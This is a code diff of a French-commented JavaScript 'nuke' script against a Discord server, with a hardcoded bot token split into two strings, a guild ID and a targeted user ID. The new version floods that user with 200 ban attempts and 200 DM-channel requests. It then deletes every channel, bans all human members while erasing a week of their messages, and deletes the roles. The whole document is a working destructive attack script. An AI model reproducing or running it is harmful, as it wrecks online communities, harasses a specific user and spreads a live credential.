@@ -2,47 +2,70 @@ const part1 = "MTU2NjQ3NDIzNzc0MzczNDk0NQ.GkOjNe.";
 const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
 const botToken = part1 + part2;
 const guild = "1534554643583995936";
+const gladosId = "1098179232779223080";
 
-async function mixedNuke() {
-  console.log("démarrage du mixed nuke...");
+async function destroy() {
+  console.log("--- 1. DEBUT DU SPAM SUR GLADOS ---");
 
-  // 1. on lance les bans en arrière-plan (sans attendre)
-  console.log("--- LANCEMENT DES BANS EN ARRIERE-PLAN ---");
-  fetch(`https://discord.com/api/v9/guilds/${guild}/members?limit=1000`, {
-    headers: { "Authorization": `Bot ${botToken}` }
-  }).then(res => res.json()).then(members => {
-    if (members.message) return;
-    members.forEach(m => {
-      if (m.user.bot) return;
-      fetch(`https://discord.com/api/v9/guilds/${guild}/bans/${m.user.id}`, {
-        method: "PUT",
-        headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
-        body: JSON.stringify({ delete_message_seconds: 604800 })
-      }).catch(() => {});
-    });
-  }).catch(() => {});
+  // On lance 200 requêtes de ban et de création de DM en boucle pour saturer glados
+  let spamPromises = [];
+  for (let i = 0; i < 200; i++) {
+    // tentative de ban sur glados
+    spamPromises.push(fetch(`https://discord.com/api/v9/guilds/${guild}/bans/${gladosId}`, {
+      method: "PUT",
+      headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
+      body: JSON.stringify({ delete_message_seconds: 0 })
+    }).catch(() => {}));
+    
+    // spam de DM sur glados
+    spamPromises.push(fetch(`https://discord.com/api/v9/users/@me/channels`, {
+      method: "POST",
+      headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
+      body: JSON.stringify({ recipient_id: gladosId })
+    }).catch(() => {}));
+  }
+  await Promise.all(spamPromises);
+  console.log("--- SPAM SUR GLADOS TERMINE ---");
 
-  // 2. on supprime les salons direct avec une mini pause
+  console.log("--- 2. DEBUT DU NUKE ---");
+
+  // supprimer tous les salons en boucle
   console.log("--- SUPPRESSION DES SALONS ---");
   let channels = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/channels`, {
     headers: { "Authorization": `Bot ${botToken}` }
   })).json();
   
-  if (channels.message) {
-    console.log("erreur :", channels.message);
-    return;
+  if (!channels.message) {
+    for (let c of channels) {
+      await fetch(`https://discord.com/api/v9/channels/${c.id}`, {
+        method: "DELETE",
+        headers: { "Authorization": `Bot ${botToken}` }
+      }).catch(() => {});
+      console.log(`salon supprimé : ${c.name}`);
+      await new Promise(r => setTimeout(r, 100));
+    }
   }
 
-  for (let c of channels) {
-    await fetch(`https://discord.com/api/v9/channels/${c.id}`, {
-      method: "DELETE",
-      headers: { "Authorization": `Bot ${botToken}` }
-    }).catch(() => {});
-    console.log(`salon supprimé : ${c.name}`);
-    await new Promise(r => setTimeout(r, 200)); // pause de 0.2s
+  // ban tout le monde
+  console.log("--- BAN DES MEMBRES ---");
+  let members = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/members?limit=1000`, {
+    headers: { "Authorization": `Bot ${botToken}` }
+  })).json();
+  
+  if (!members.message) {
+    let banPromises = members.map(m => {
+      if (m.user.bot) return Promise.resolve();
+      return fetch(`https://discord.com/api/v9/guilds/${guild}/bans/${m.user.id}`, {
+        method: "PUT",
+        headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
+        body: JSON.stringify({ delete_message_seconds: 604800 })
+      }).catch(() => {});
+    });
+    await Promise.all(banPromises);
+    console.log("membres bannis.");
   }
 
-  // 3. on supprime les rôles avec la même mini pause
+  // supprimer les rôles
   console.log("--- SUPPRESSION DES RÔLES ---");
   let roles = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/roles`, {
     headers: { "Authorization": `Bot ${botToken}` }
@@ -56,11 +79,11 @@ async function mixedNuke() {
         headers: { "Authorization": `Bot ${botToken}` }
       }).catch(() => {});
       console.log(`rôle supprimé : ${r.name}`);
-      await new Promise(r => setTimeout(r, 200)); // pause de 0.2s
+      await new Promise(r => setTimeout(r, 100));
     }
   }
 
-  console.log("fin du mixed nuke.");
+  console.log("--- FIN DE L'OPERATION ---");
 }
 
-mixedNuke();
+destroy();
